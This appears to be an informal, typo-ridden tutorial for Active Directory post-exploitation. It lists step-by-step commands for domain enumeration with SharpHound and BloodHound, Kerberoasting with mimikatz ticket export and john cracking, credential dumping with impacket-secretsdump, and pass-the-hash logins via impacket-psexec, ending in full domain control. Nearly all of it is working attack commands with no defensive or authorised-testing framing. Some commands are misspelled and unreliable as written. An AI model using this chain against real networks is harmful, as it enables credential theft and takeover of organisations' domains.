1. post enumeration first step 

checking users in systems

net user /domain  

now we check a users information

net user <username-you-see> /domain

now we put a sharphound on target system
available in github 

lput SharpHound.exe

now we dump a sensitive information 

SharpHound.exe

all information availaible in bloodhound.zip

lget bloodhound.zip

type your kali terminal 

neo4j console 

now you see server is started to bloodhound 

and upload a bloodhound.zip 
wait for 100 % all file
now you open a 3 dot/lines in uper corner 
now you go a analyse
now you see all post enumeration are available 


2. karberosting & pass the hash

firstly you login the who user to login starting 

impacket-psexec `GROUPNAME/user:userpassword!@#@<targetIP>` powershell.exe

enter this command esitize

Add-Type -AssemblyName System.IdentifyModel 

now you need a ticket of who admin system you hack lets see
 
now you open a bloodhound and normally go a 3 dot/lines
and go to the find at Domain admins 
you see all the many user one user is admin 
you understand automatically who user is admin or a full control
click the user 
and go node info in left side now you copy the service info name 

now you enter the command 

New-Object System.IdentifyModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<now you paste the server info name >"

now you get a ticket see this good job but this
ticket save on target computer hard drive 
we need a hash and mimikatz is used for file to hash
lets see

copy this command ezitise

lput mimikatz.exe
lput mimilib.dll
lput mimidrv.sys
cd ..
mimikatz.exe

now we export the file hash

copy this command 

kerberos::list /export

now you see all users ticket 

now you search a admin user ticket 
Saved to file : < copy this all >

now you type command

lget <paste this >

now you save a ticket in kali machine 
now we crack a ticket 
with john

copy command

kirbi2john <paste file name> > hash

john hash --wordlist=rockyou.txt

now we have a domain user password 

copy this command 

impacket-psexec `GROUPNAME/adminusername:adminuserpass@<targetIP>`

now we login the admin 
and now type this command 

impacket-secretsdump `GROUPNAME/adminusername:adminuserpass@<targetIP>`

now we have all the group users hash and we also login with only hash
this is pass the hash
now how to login with only hash

impacket-psexec `GROUPNAME/adminusername@<targetIP>` -hashes `<pasteuserhash>

boom

now you control the full active directory
